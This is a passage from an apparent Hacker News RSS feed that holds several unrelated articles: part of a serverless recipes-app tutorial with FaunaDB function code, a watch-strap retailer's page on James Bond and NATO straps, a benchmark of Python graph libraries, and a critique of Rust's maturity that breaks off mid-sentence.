<a href="https://github.com/netlify/gotrue" title="GoTrue" target="_blank" rel="noopener">GoTrue</a> API” (both by Netlify).</p><blockquote><p>GoTrue is a small open-source API written in golang, that can act as a self-standing API service for handling user registration and authentication for JAM projects.</p></blockquote><p>On top of that, large parts of the code I used for my app’s user authentication process are based on
<a href="https://github.com/chiubaca/vue-netlify-fauna-starter-kit" title="this repository" target="_blank" rel="noopener">this repository</a> where <code>gotrue-js</code> was successfully implemented for a Vue.js based application. A truly helpful resource indeed.</p><h3 id="functions">Functions</h3><p>With both the Vue app and the FaunaDB instance up and running, the following serverless functions can be considered the app’s backbone. To make them work, FaunaDB’s JavaScript Driver, the client secret and
<a href="https://docs.fauna.com/fauna/current/api/fql/" title="Fauna Query Language" target="_blank" rel="noopener">Fauna Query Language</a> are used.</p><h4 id="read-recipes-from-the-database">Read Recipes from the Database</h4><p>Recipes are stored in the database as an array of JSON data. In order to display those recipes to the app’s users, they have to be obtained from the database when one of these things happens:</p><ol><li>User navigates to the app’s front page</li><li>User navigates to an individual recipe’s details page</li><li>User navigates to the “My Recipes” page</li></ol><p>These cases are implemented as a separate Netlify function each. First, we’ll have a look at the function called <code>all-recipes.js</code>:</p><div><pre><code data-lang="js"><span>const</span> <span>faunadb</span> <span>=</span> <span>require</span><span>(</span><span>'faunadb'</span><span>);</span>

<span>const</span> <span>q</span> <span>=</span> <span>faunadb</span><span>.</span><span>query</span>
<span>const</span> <span>client</span> <span>=</span> <span>new</span> <span>faunadb</span><span>.</span><span>Client</span><span>({</span>
  <span>secret</span><span>:</span> <span>process</span><span>.</span><span>env</span><span>.</span><span>FAUNADB_SECRET</span>
<span>})</span>

<span>exports</span><span>.</span><span>handler</span> <span>=</span> <span>(</span><span>event</span><span>,</span> <span>context</span><span>,</span> <span>callback</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>console</span><span>.</span><span>log</span><span>(</span><span>"Function `all-recipes` invoked"</span><span>)</span>
  <span>return</span> <span>client</span><span>.</span><span>query</span><span>(</span><span>q</span><span>.</span><span>Paginate</span><span>(</span><span>q</span><span>.</span><span>Match</span><span>(</span><span>q</span><span>.</span><span>Ref</span><span>(</span><span>"indexes/all_recipes"</span><span>))))</span>
  <span>.</span><span>then</span><span>((</span><span>response</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> <span>recipeRefs</span> <span>=</span> <span>response</span><span>.</span><span>data</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>"Recipe refs"</span><span>,</span> <span>recipeRefs</span><span>)</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>`</span><span>${</span><span>recipeRefs</span><span>.</span><span>length</span><span>}</span><span> recipes found`</span><span>)</span>
    <span>const</span> <span>getAllRecipeDataQuery</span> <span>=</span> <span>recipeRefs</span><span>.</span><span>map</span><span>((</span><span>ref</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>return</span> <span>q</span><span>.</span><span>Get</span><span>(</span><span>ref</span><span>)</span>
    <span>})</span>
    <span>return</span> <span>client</span><span>.</span><span>query</span><span>(</span><span>getAllRecipeDataQuery</span><span>).</span><span>then</span><span>((</span><span>ret</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>return</span> <span>callback</span><span>(</span><span>null</span><span>,</span> <span>{</span>
        <span>statusCode</span><span>:</span> <span>200</span><span>,</span>
        <span>body</span><span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>ret</span><span>)</span>
      <span>})</span>
    <span>})</span>
  <span>}).</span><span>catch</span><span>((</span><span>error</span><span>)</span> <span>=&gt;</span> <span>{...})</span>
<span>}</span>
</code></pre></div><p>Once a connection is established, the function queries for the <code>all_recipes</code> index (manually generated for the recipes collection when setting up the database) which returns a
<a href="https://docs.fauna.com/fauna/current/api/fql/functions/paginate?lang=javascript" title="Page" target="_blank" rel="noopener">Page</a> of results. These results - essentially an array of recipe IDs - are then processed by the function <code>getAllRecipeDataQuery()</code> which eventually returns an array of all recipes complete which each one of their individual properties (name, description, image, etc.).</p><p>The Netlify function <code>recipe-get.js</code> queries the database for a single recipe and looks like this:</p><div><pre><code data-lang="js"><span>const</span> <span>faunadb</span> <span>=</span> <span>require</span><span>(</span><span>'faunadb'</span><span>);</span>

<span>function</span> <span>getId</span><span>(</span><span>urlPath</span><span>)</span> <span>{</span>
  <span>return</span> <span>urlPath</span><span>.</span><span>match</span><span>(</span><span>/([^\/]*)\/*$/</span><span>)[</span><span>0</span><span>]</span>
<span>}</span>

<span>const</span> <span>q</span> <span>=</span> <span>faunadb</span><span>.</span><span>query</span>
<span>const</span> <span>client</span> <span>=</span> <span>new</span> <span>faunadb</span><span>.</span><span>Client</span><span>({</span>
  <span>secret</span><span>:</span> <span>process</span><span>.</span><span>env</span><span>.</span><span>FAUNADB_SECRET</span>
<span>})</span>

<span>exports</span><span>.</span><span>handler</span> <span>=</span> <span>(</span><span>event</span><span>,</span> <span>context</span><span>,</span> <span>callback</span><span>)</span> <span>=&gt;</span> …</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ttntm.me/blog/serverless-recipes-app-faunadb-vuejs/">https://ttntm.me/blog/serverless-recipes-app-faunadb-vuejs/</a></em></p>]]>
            </description>
            <link>https://ttntm.me/blog/serverless-recipes-app-faunadb-vuejs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24527105</guid>
            <pubDate>Sat, 19 Sep 2020 12:55:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NATO Strap and James Bond]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24527065">thread link</a>) | @tosh
<br/>
September 19, 2020 | https://www.esprit-nato.com/en/content/10-nato-watch-strap-band-and-james-bond-007 | <a href="https://web.archive.org/web/*/https://www.esprit-nato.com/en/content/10-nato-watch-strap-band-and-james-bond-007">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content-wrapper">
    
    

  <section id="main">

    
      
        
      
    

    
  <section id="content">

    
      
<p>———— ♦ ————</p>

<p>We widely detail attractive features of NATO strap on Esprit NATO, we are here concentrating on the myth "James Bond and NATO straps".</p>
<p>Let's start with the bad news : <strong>Sean Connery's strap in Golfinger (1964) was not a NATO strap</strong>. Many of us think the opposite, which have most likely contributed to the sucess of NATO straps, but we believe this watch strap first became famous mainly because of its characteristics and many benefits.</p>
<p>However, <strong>James Bond and NATO straps are indeniably connected</strong>. Why ? This is what we suggest to focus on this page...</p>

<p>———— ♦ ————</p>
<h3>James Bond was wearing a nylon strap in Goldfinger in 1964</h3>

<p><img src="https://www.esprit-nato.com/img/cms/James%20Bond/Sean-Connery-nylon-watch-strap-Goldfinger-1964.jpg" alt="" width="800" height="649"></p>

<p>The nylon strap was then put on the famous <strong>Rolex Submariner ref. 6538</strong>, iconic James Bond's watch.</p>

<p><img src="https://www.esprit-nato.com/img/cms/James%20Bond/Sean-Connery-nylon-watch-strap-Goldfinger-1964-focus-1.jpg" alt="" width="800" height="480"></p>

<p>It was 16 mm wide on a 20 mm lug width watch. It's a unique and surprising style as much aesthetically as functionaly. Not so British...</p>
<p>It is said that the strap <strong>belonged to a member of the production team</strong> who came to the assitance of this Submariner at the last minute. This would be an explanation of the wrong width... A mishap that would have left its mark in history ? We were unable to verify this information.</p>

<p>———— ♦ ————</p>
<h3>Why did this Submariner 6538 absolutely need a nylon strap ?</h3>
<p>Because at that time none other strap enabled to put James Bond's watch both on his wrist and on his diving suit, <strong>typical feature of nylon strap,</strong> which thereafter is part of&nbsp;<a href="https://www.esprit-nato.com/content/9-l-histoire-du-bracelet-nato" target="_blank" rel="noreferrer noopener">some requirements for the Royal Navy</a>...</p>

<p><img src="https://www.esprit-nato.com/img/cms/James%20Bond/Sean-Connery-nylon-watch-strap-Goldfinger-1964-focus-2.jpg" alt="" width="800" height="628"></p>

<p>———— ♦ ————</p>
<h3>Why is this Goldfinger strap not a NATO strap ?</h3>
<p>For two reasons :</p>
<p>- NATO straps and its strict requirements emerged <strong>nine years after</strong>, in 1973, further to British MOD request - <a href="https://www.esprit-nato.com/content/9-l-histoire-du-bracelet-nato" target="_blank" rel="noreferrer noopener">we explain this in detail on a dedicated page</a>.</p>
<p>- Sean Connery's Submariner strap in Goldfinger has <strong>a nylon loop</strong>, whereas NATO straps have two steel loops.</p>

<p><img src="https://www.esprit-nato.com/img/cms/James%20Bond/Sean-Connery-nylon-watch-strap-Goldfinger-1964-focus-3.jpg" alt="" width="800" height="827"></p>

<p>James Bond was then wearing a single pass nylon strap with a nylon loop from the same band (same width and pattern).</p>
<p><a href="https://www.esprit-nato.com/bracelets-montre-nylon/153-le-vrai-james-bond-sean-connery-dans-goldfinger-noir-kaki-rouge.html" target="_blank" rel="noreferrer noopener">We are proposing a version here on Esprit NATO</a>.</p>

<p>———— ♦ ————</p>
<h3>Another nylon strap in Goldfinger</h3>
<p>Pussy Galore, Goldfinger's private pilot, was wearing a Coke Rolex GMT Master ref. 6542 on a nylon strap too. Her character was one of the first woman to wear a Rolex sport watch for men in a movie.</p>

<p><img src="https://www.esprit-nato.com/img/cms/James%20Bond/Pussy-Galore-nylon-strap-Rolex-6542-Goldfinger-1964.jpg" alt="" width="800" height="1077"></p>

<p>Was nylon strap already essential ?</p>

<p>———— ♦ ————</p>
<h3>The real NATO strap in James Bond world</h3>

<p><img src="https://www.esprit-nato.com/img/cms/James%20Bond/publicite-bracelet-NATO-James-Bond.jpg" alt="" width="800" height="360"></p>

<p>We have seen several similarities between Sean Connery's nylon strap in Goldfinger and <a href="https://www.esprit-nato.com/content/9-l-histoire-du-bracelet-nato" target="_blank" rel="noreferrer noopener">the original NATO designed for British army</a>. It is probably <strong>the origin of the confusion</strong>...</p>

<p>———— ♦ ————</p>
<h3>Myth becomes reality</h3>
<p>In 2008, Daniel Craig is wearing a Rolex 6538 Submariner "Big Crown" offered by Barbara Broccoli, current producer of James Bond movies, and daughter of the original James Bond producer (Albert "Cubby" Broccoli), and he is wearing this inconic watch on ...</p>

<p><img src="https://www.esprit-nato.com/img/cms/James%20Bond/bracelet-NATO-Daniel-Craig-James-Bond-Rolex-Submariner-6538-1.jpg" alt="" width="799" height="1249"></p>

<p>No doubt, it is a real NATO strap as we clearly identify one of its typical stainless steel loops.</p>

<p>———— ♦ ————</p>
<h3>James Bond straps on Esprit NATO</h3>
<h4>The most mythical</h4>
<p>The most mythical pattern is Sean Connery's one in Goldfinger, Black 2 Green stripes and Burgundy borders. We propose it in multiple variations <strong>under the name "Bond Original"</strong>.</p>
<p><a href="https://www.esprit-nato.com/bracelets-montre-nylon/153-le-vrai-james-bond-sean-connery-dans-goldfinger-noir-kaki-rouge.html" target="_blank" rel="noreferrer noopener">But here is the authentic Bond Original Goldfinger strap</a> :</p>

<p><a href="https://www.esprit-nato.com/bracelets-montre-nylon/153-le-vrai-james-bond-sean-connery-dans-goldfinger-noir-kaki-rouge.html" target="_blank" rel="noreferrer noopener"><img src="https://www.esprit-nato.com/img/cms/James%20Bond/Bracelet-US-Military-Vrai-James-Bond-Sean-Connery-Noir-Kaki-Rouge.jpg" alt="" width="801" height="534"></a></p>

<h4>The most famous</h4>
<p>The most famous James Bond pattern is the Black 2 Grey stripes, for several reasons :</p>
<ul><li>It is Daniel Craig's one.</li>
<li>Goldfinger movie was initially in black and white, so the original pattern looked like black and grey. Confusion has existed for a long time...</li>
<li>It matches to any watch, any style and any other colours, and remains sober despite its strong character.</li>
</ul><p>We propose it <strong>under the name "Craig Bond"</strong>. It is so essential that you will find on Esprit NATO in <strong>every design and size</strong>.</p>

<p><a href="https://www.esprit-nato.com/nato-boucles-polies-bracelets-montre/276-bracelet-nylon-nato-bond-craig-noir-gris-boucle-polie.html" target="_blank" rel="noreferrer noopener"><img src="https://www.esprit-nato.com/img/cms/James%20Bond/Bracelet-NATO-Prestige-James-Bond-Craig-Noir-Gris.jpg" alt="" width="801" height="534"></a></p>

<h4>Others</h4>
<p>By extension, we name <a href="https://www.esprit-nato.com/6-nato-james-bond-bracelets-montre" target="_blank" rel="noreferrer noopener"><strong>"James Bond NATO straps"</strong></a> every 2 stripes strap (with or without borders).</p>

<p><a href="https://www.esprit-nato.com/6-nato-james-bond-bracelets-montre" target="_blank" rel="noreferrer noopener"><img src="https://www.esprit-nato.com/img/cms/James%20Bond/bracelets-nato-james-bond-straps.jpg" alt="" width="800" height="435"></a></p>

<hr><p><em>We hope you are now convinced that NATO strap and James Bond are connected forever.</em></p>
<p><em>However, if you want to watch Goldfinger again or to buy a Bond NATO, then we succeeded in our mission...</em></p>

    

    
      
    

    
      
    

  </section>


    
      
    

  </section>


    
  </div></div>]]>
            </description>
            <link>https://www.esprit-nato.com/en/content/10-nato-watch-strap-band-and-james-bond-007</link>
            <guid isPermaLink="false">hacker-news-small-sites-24527065</guid>
            <pubDate>Sat, 19 Sep 2020 12:48:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Benchmark of popular graph/network packages]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526881">thread link</a>) | @dvfjsdhgfv
<br/>
September 19, 2020 | https://www.timlrx.com/2019/05/05/benchmark-of-popular-graph-network-packages/ | <a href="https://web.archive.org/web/*/https://www.timlrx.com/2019/05/05/benchmark-of-popular-graph-network-packages/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <div>
    <div>
      <article role="main">
        



<p><strong>This post is superseded by an <a href="https://www.timlrx.com/2020/05/10/benchmark-of-popular-graph-network-packages-v2/">updated benchmark</a></strong></p>
<p>In this post I benchmark the performance of 5 popular graph/network packages. This was inspired by two questions I had:</p>
<ol>
<li><p>Recently, I have been working with large networks (millions of vertices and edges) and often wonder what is the best currently available package/tool that would scale well and handle large scale network analysis tasks. Having tried out a few (networkx in Python and igraph in R) but on different problems, I thought it would be nice to have a head to head comparison.</p></li>
<li><p>Running large scale computations is also much easier nowadays with the availability of virtual machines that could be easily spinned up thanks to the growth of cloud computing. I think the trend of powerful single machines will eliminate a lot of the need for enterprise clusters so it will be interesting to see how far we can push a single machine using optimised algorithms.<a href="#fn1" id="fnref1"><sup>1</sup></a></p></li>
</ol>
<p>To replicate the benchmark study and for the full codes, please refer to <a href="https://github.com/timlrx/graph-benchmarks">my github repository</a>. Instructions on how to setup and install the packages are also located in the repository.</p>
<div id="setup">
<h2>Setup</h2>
<p>The benchmark was carried out using a Google Compute n1-standard-16 instance (16vCPU Haswell 2.3GHz, 60 GB memory). I compare 5 different packages:</p>
<ul>
<li><a href="https://graph-tool.skewed.de/">graph-tool</a></li>
<li><a href="https://igraph.org/redirect.html">igraph</a></li>
<li><a href="https://networkit.github.io/">networkit</a></li>
<li><a href="https://networkx.github.io/">networkx</a></li>
<li><a href="https://snap.stanford.edu/snappy/">snap</a></li>
</ul>
<p>Networkx is written in Python while the other four packages are based on C / C++ but have Python APIs. Igraph has a R and Mathematica binding as well but to be consistent the following benchmark was based on the Python one. The other 3 libraries (snap, networkit and graph-tool) have an additional emphasis on performance with multi-processing capabilities built in.</p>
<p>Selecting what tasks to compare on is not really a trivial task with each package offering various tools and capabilities. In the end, I decided to focus on 5 specific problems:</p>
<ul>
<li>loading the data</li>
<li>single source shortest path</li>
<li>page rank</li>
<li>k-core decomposition</li>
<li>strongly connected components</li>
</ul>
<p>Loading is more of an I/O task while the other 4 are common graph algorithms. Disclaimer: I try as much as possible to specify the same parameters for each algorithm but differences in API across the packages could translate to actual differences in how the algorithm is run and the final output.</p>
<p><span>13/12/2019 Edit: Some of the observed differences in performance might be a result of different stopping criteria used - see algorithms for more information.</span></p>
<p>3 datasets from the <a href="https://snap.stanford.edu/data/index.html">Stanford Large Network Dataset Collection</a> were used in the exercise:</p>
<ul>
<li><a href="https://snap.stanford.edu/data/amazon0302.html">amazon</a>, 262k nodes, 1.2m edges</li>
<li><a href="https://snap.stanford.edu/data/web-Google.html">google</a>, 875k nodes, 5.1m edges</li>
<li><a href="https://snap.stanford.edu/data/soc-Pokec.html">pokec</a>, 1.6m nodes, 30.6m edges</li>
</ul>
<p>While it is the easiest to rank the packages based on the run-time of the algorithms, it is only one of the many considerations of what makes a good package. I try to offer a more subjective view based on my experience with these packages.</p>
</div>

<div id="results">
<h2>Results</h2>
<p>All timings reported are normalised to reflect the run time for a single run of the task.</p>
<p>Networkx is much slower than any of the other libraries. Across all computation tasks and for all datasets it is around 10 times slower than the <em>slowest</em> library.<a href="#fn2" id="fnref2"><sup>2</sup></a> For example, it took 67s to run the single source shortest path problem on the Pokec dataset compared to 6.8s for networkit (the next slowest). Page rank took more than 10 minutes to run compared to 1 minute for igraph. Hence, I left it out of the comparison plots.</p>
<p>Here are the run times of the remaining four packages:</p>
<p><img src="https://d33wubrfki0l68.cloudfront.net/b13c3d06c53af36cafd2b861d21948ee7613dd3a/3c0f3/post/2019-05-05-benchmark-of-popular-graph-network-packages_files/figure-html/plot_all-1.png" width="672"></p>
<p>Full results can be seen from the table below:</p>
<table>
<thead>
<tr>
<th>
dataset
</th>
<th>
Algorithm
</th>
<th>
graph-tool
</th>
<th>
igraph
</th>
<th>
networkit
</th>
<th>
networkx
</th>
<th>
snap
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
Amazon
</td>
<td>
connected components
</td>
<td>
0.09
</td>
<td>
0.48
</td>
<td>
0.21
</td>
<td>
5.94
</td>
<td>
0.40
</td>
</tr>
<tr>
<td>
Amazon
</td>
<td>
k-core
</td>
<td>
0.11
</td>
<td>
0.33
</td>
<td>
0.01
</td>
<td>
8.62
</td>
<td>
0.42
</td>
</tr>
<tr>
<td>
Amazon
</td>
<td>
loading
</td>
<td>
5.00
</td>
<td>
0.79
</td>
<td>
3.27
</td>
<td>
9.96
</td>
<td>
1.90
</td>
</tr>
<tr>
<td>
Amazon
</td>
<td>
page rank
</td>
<td>
0.05
</td>
<td>
1.59
</td>
<td>
0.01
</td>
<td>
25.71
</td>
<td>
0.90
</td>
</tr>
<tr>
<td>
Amazon
</td>
<td>
shortest path
</td>
<td>
0.06
</td>
<td>
0.12
</td>
<td>
0.32
</td>
<td>
3.31
</td>
<td>
0.14
</td>
</tr>
<tr>
<td>
Google
</td>
<td>
connected components
</td>
<td>
0.32
</td>
<td>
2.23
</td>
<td>
0.65
</td>
<td>
21.71
</td>
<td>
2.02
</td>
</tr>
<tr>
<td>
Google
</td>
<td>
k-core
</td>
<td>
0.57
</td>
<td>
1.68
</td>
<td>
0.06
</td>
<td>
153.21
</td>
<td>
1.57
</td>
</tr>
<tr>
<td>
Google
</td>
<td>
loading
</td>
<td>
67.27
</td>
<td>
5.51
</td>
<td>
17.94
</td>
<td>
39.69
</td>
<td>
9.03
</td>
</tr>
<tr>
<td>
Google
</td>
<td>
page rank
</td>
<td>
0.76
</td>
<td>
5.24
</td>
<td>
0.12
</td>
<td>
106.49
</td>
<td>
4.16
</td>
</tr>
<tr>
<td>
Google
</td>
<td>
shortest path
</td>
<td>
0.20
</td>
<td>
0.69
</td>
<td>
0.98
</td>
<td>
12.33
</td>
<td>
0.30
</td>
</tr>
<tr>
<td>
Pokec
</td>
<td>
connected components
</td>
<td>
1.35
</td>
<td>
17.75
</td>
<td>
4.69
</td>
<td>
108.07
</td>
<td>
15.28
</td>
</tr>
<tr>
<td>
Pokec
</td>
<td>
k-core
</td>
<td>
5.73
</td>
<td>
10.87
</td>
<td>
0.34
</td>
<td>
649.81
</td>
<td>
8.87
</td>
</tr>
<tr>
<td>
Pokec
</td>
<td>
loading
</td>
<td>
119.57
</td>
<td>
34.53
</td>
<td>
157.61
</td>
<td>
237.72
</td>
<td>
59.75
</td>
</tr>
<tr>
<td>
Pokec
</td>
<td>
page rank
</td>
<td>
1.74
</td>
<td>
59.55
</td>
<td>
0.20
</td>
<td>
611.24
</td>
<td>
19.52
</td>
</tr>
<tr>
<td>
Pokec
</td>
<td>
shortest path
</td>
<td>
0.86
</td>
<td>
0.87
</td>
<td>
6.87
</td>
<td>
67.15
</td>
<td>
3.09
</td>
</tr>
</tbody>
</table>
<div id="io">
<h3>I/O</h3>
<p>Looking at the plots above, graph-tool and networkit loads data much more slowly than the other two libraries. I was reading the datasets as a tab delimited file and graph-tool basically uses a Python code to parse the input. The other 3 packages should be using C libraries to read the files which result in better performance.<a href="#fn3" id="fnref3"><sup>3</sup></a></p>
</div>
<div id="algorithms">
<h3>Algorithms</h3>
<p>Networkit and graph-tool takes the top spot in most of the tests with graph-tool having the shortest run time for the single source shortest path and connected components problems and networkit winning the race for k-core and page rank.</p>
<p>When networkit is fast, it is extremely fast. On the pokec dataset it takes just 0.2s to run the page rank algorithm (graph-tool: 1.7s, igraph: 59.6s, snap: 19.5s). For the k-core decomposition it is also 10 times faster than all other competitors or 2000 times networkx. That is consistent with the findings of their research paper where they claim that using some of the latest state of the art algorithms led to their processing speed being faster by an order of magnitude. However, for the shortest path problem (not analysed in their paper) it lags behind all other packages.<a href="#fn4" id="fnref4"><sup>4</sup></a></p>
<p><span>13/12/2019 Edit: Matthew Galati from SAS pointed out that for the pagerank algorithm, networkit (as of version 6.0) uses L2 norm as a stopping criteria while other packages use the L1 norm. This means that it is doing fewer iterations and the speed is somewhat artificial. Thanks Matthew!</span></p>
<p>graph-tool is the most steady performer and achieves very impressive performance across all four tasks. With openMP support it betters igraph and snap across all tasks. It is 3 to 10+ times faster than those two packages.</p>
<p>igraph and snap achieves mostly similar performance across all tasks with a slight edge towards snap. This is also consistent with snap’s research findings.</p>
</div>
<div id="other-considerations">
<h3>Other Considerations</h3>
<p>There are also other important considerations when making a switch from networkx or igraph to one graph-tool or networkit.</p>
<p><strong>Packages</strong><br>
First, the algorithms available differ quite significantly across the packages. Users interested in switching to one of these packages should read the documentation on the list of features available. For example, while they all contain the basic tools needed to manipulate networks, graph-tool does not have the more usual modular clustering tools but has additional functionalities on statistical inference on graphs using stochastic block models.</p>
<p>Visualising networks is also an important part of the analytical tool chain. Igraph implements quite a few layout algorithms and renders them using the cairo library. Snap supports graphviz while graph-tool supports both graphviz and cairo. Networkit takes a different approach and relies on networkx to draw while also providing support and integration with Gephi via its streaming plugin.</p>
<p><strong>API</strong><br>
Moving away from native Python or R means that the syntax for the packages can sometimes be quite convoluted. I compare the syntax for the shortest path problem below. Writing it in networkx would look something like this:</p>
<pre><code>nx.shortest_path_length(g, nodeid)</code></pre>
<p>igraph:</p>
<pre><code>g.shortest_paths([g.vs[node_index]])</code></pre>
<p>graph-tool:</p>
<pre><code>shortest_distance(g, g.vertex(node_index))</code></pre>
<p>networkit:</p>
<pre><code>distance.BFS(g, node_index).run()</code></pre>
<p>snap:</p>
<pre><code>NIdToDistH = snap.TIntH()
snap.GetShortPath(g, node_index, NIdToDistH, True)</code></pre>
<p>Of all, I find snap’s the most cumbersome since one has to define an additional variable (with the correct variable type) to store the results before running it. Running more advanced functions on graph-tool and networkit also requires a user to pre-define variables with the correct type to store results.<a href="#fn5" id="fnref5"><sup>5</sup></a></p>
<p><strong>Support and Documentation</strong><br>
User support and documentation is really important when one wants to use the project in an actual project setting. Networkx is by far the winner in this category with more than 4k github stars and lots of issues documented in github and stackoverflow. Igraph fairs decently as well with more than a thousand stars across its different modules.</p>
<p>graph-tool and networkit has much smaller followings though the creators seem relatively responsive to user issues and the packages are in active development.</p>
<p>snap was last updated on July 2018 but still supports only Python 2.7.x versions.</p>
</div>
<div id="conclusion">
<h3>Conclusion</h3>
<p>Overall, I am pleasantly surprised at the performance of the libraries especially graph-tool and networkit and plan to play around with them further. The fact that they breeze through the Pokec dataset is a good sign, but it will be interesting to find out what is the limit before computation becomes slow or memory issues start appearing.</p>
<p>As for recommendations on which package people should learn, I think picking up networkx is still important as it makes network science very accessible with a wide range of tools and capabilities. If analysis starts being too slow (and maybe that’s why you are here) then I will suggest taking a look at graph-tool or networkit to see if they contain the necessary algorithms for your needs.</p>
</div>
</div>



        
          
        

        

        
      </article>

      
        
      


      

    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://www.timlrx.com/2019/05/05/benchmark-of-popular-graph-network-packages/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526881</guid>
            <pubDate>Sat, 19 Sep 2020 12:09:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Rust is not a mature programming language]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 67 (<a href="https://news.ycombinator.com/item?id=24526861">thread link</a>) | @DarkCrusader2
<br/>
September 19, 2020 | https://codecs.multimedia.cx/2020/09/why-rust-is-not-a-mature-programming-language/ | <a href="https://web.archive.org/web/*/https://codecs.multimedia.cx/2020/09/why-rust-is-not-a-mature-programming-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>While I have nothing against Rust as such and keep writing my pet project in Rust, there are still some deficiencies I find preventing Rust from being a proper programming language. Here I’d like to present them and explain why I deem them as such even if not all of them have any impact on me.<br>
<span id="more-1971"></span></p>
<h3>Rust language problems</h3>
<p>First and foremost, <strong>Rust does not have a formal language specification</strong> and by that I mean that while some bits like grammar and objects are explained, there are no formal rules to describe what language features can and cannot be. If you’ve ever looked at ISO C standard you’ve seen that almost any entity there has three or four parts in the description: formal syntax, constraints (i.e. what is not allowed or what can’t be done with it), semantics (i.e. what it does, how it impacts the program, what implementation caveats are there), and there may be some examples to illustrate the points. The best close equivalent in Rust is <a href="https://doc.rust-lang.org/reference/" rel="noopener noreferrer" target="_blank">The Rust Reference</a> and e.g. structure there is described in the following way: syntax (no objections there), definition in a form of “A struct is a nominal struct type defined with the keyword <code>struct</code>.”, examples, a brief mention of empty (or unit-like) structures in the middle of examples, and “The precise memory layout of a struct is not specified.” at the end. I understand that adding new features is more important than documenting them but this is lame.</p>
<p>A proper mature language (with 1.0 in its version) should have a formal specification that should be useful both for people developing compilers and the programmers trying to understand certain intricacies of the language and why it does not work as expected (more on that later). For example, for that <code>struct</code> definition I find lacking at least these: mentioning that you can have <code>impl</code> for it (even a reference would do—even if you have to repeat it for every type), split off tuples into a separate entry because it’s very different syntactically and raises a question why you have anonymous tuples and not anonymous structs (which you also can’t find from the documentation), and of course create proper layout so that rather important information (about memory layout for example) is not lost among examples.</p>
<p>And now to the specific problems I encounter quite often and I don’t know whether I understand it wrong or the compiler understands it wrong. And since there’s no formal specification I can’t tell which one it is (even if the former is most probable).</p>
<p><strong>Function/method calling convention.</strong> Here’s a simple example:</p>
<blockquote><p>
struct Foo { a: i32 }<br>
impl Foo { fn bar(&amp;mut self, val: i32) { self.a = val + 42; } }<br>
fn main() {<br>
&nbsp; let mut foo = Foo { a: 0 };<br>
&nbsp; foo.bar(foo.a);<br>
}
</p></blockquote>
<p>For now this won’t compile because of the borrowing but shouldn’t the compiler be smart enough to create a copy of <code>foo.a</code> before call? I’m not sure but IIRC current implementation first mutably borrows object for the call and only then tries to borrow the arguments. Is it really so and if yes, why? <em>Update:</em> I’m told that newer versions of the compiler handle it just fine but the question still stands (was it just a compiler problem or the call definition has been changed?).</p>
<p>The other thing is the old C caveat of function arguments evaluation. Here’s a simple example:</p>
<blockquote><p>
let mut iter = “abc”.chars();<br>
foo(iter.next().unwrap(), iter.next().unwrap(), iter.next().unwrap());
</p></blockquote>
<p>So would it be <code>foo('a','b','c')</code> or <code>foo('c','b','a')</code> call. In C it’s undefined because it depends on how arguments are passed on the current platform (consider yourself lucky if you don’t remember <code>__pascal</code> or <code>__stdcall</code>). In Rust it’s undefined because there’s no formal specification to tell you even that much. And it would be even worse if you consider that you may use the same source for indexing the caller object like <code>handler[iter.next().unwrap() as usize].process(iter.next().unwrap());</code> in some theoretical bytecode handler (of course it’s a horrible way to write code and you should use named temporary variables but it should illustrate the problem).</p>
<p>And another source of annoyance for me is <strong>traits</strong>. I have almost no problems with owning/lifetime/borrowing concepts but traits get me almost every time. I’m vaguely aware that the answer to why the following problems exist is “because traits are implemented as a call table” but again, <em>should</em> they be implemented like that and what should be the constraints on them (after all the original object should be somehow linked to the trait pointer). So when you have a supertrait (i.e. <code>trait Foo: Bar</code>) you can’t easily cast it for subtrait (e.g. <code>&amp;Foo -&gt; &amp;Bar</code>) without writing a lot of boilerplate code. And even worse if you convert an object into <code>Box&lt;trait&gt;</code> there’s no way to get the original object back (still in boxed form of course; I remember seeing a special crate that implements a lot of boilerplate code in order to get a mutable reference though). To reiterate: the problem is not me being stupid but rather the lack of formal description on how it’s done and why what I want is so hard. Then I’d probably at least be able to realize how I should change my code to work around the limitations.</p>
<h3><code>rustc</code> problems</h3>
<p>No, I’m not going to talk about compilation speed. It’s certainly a nuisance but not a problem per se. Here I want to point rather theoretical problems that a mature language should not have. And having just one compiler is one of those problems (call that problem zero).</p>
<p>First of all, <strong>bootstrapping process</strong> is laughably bad. I realize that it’s never too easy but if you call yourself a systems programming language you should be able to bootstrap a compiler in a sane amount of steps. For instance, IIRC <code>Guix</code> has the following bootstrapping process for C compiler: simple C complier in Scheme (for which you can often write an implementation in assembly by hand) compiles TCC, TCC compiles GCC 2.95, GCC 2.95 compiles GCC 3.7, GCC 3.7 compiles GCC 4.9. For <code>rustc</code> you should either start with the original compiler written in OCaml and compile every following version with the previous one (i.e. 1.17 with 1.16) or cheat by using <code>mrustc</code> written in C++ which can compile Rust 1.19 or 1.29 (without borrow checks), then compile 1.30 with 1.29, 1.31 with 1.30 etc etc. The problem here is that you cannot skip versions and e.g. compile <code>rustc 1.46</code> with <code>rustc 1.36</code> (I’d be happy to learn that I’m wrong). IMO you should have maybe an ineffective compiler but written in a dialect that much older compiler should understand i.e. <code>rustc 1.0</code> should be able to compile a compiler for 1.10, which can be used to compile 1.20 and so forth. Of course it’s a huge waste of 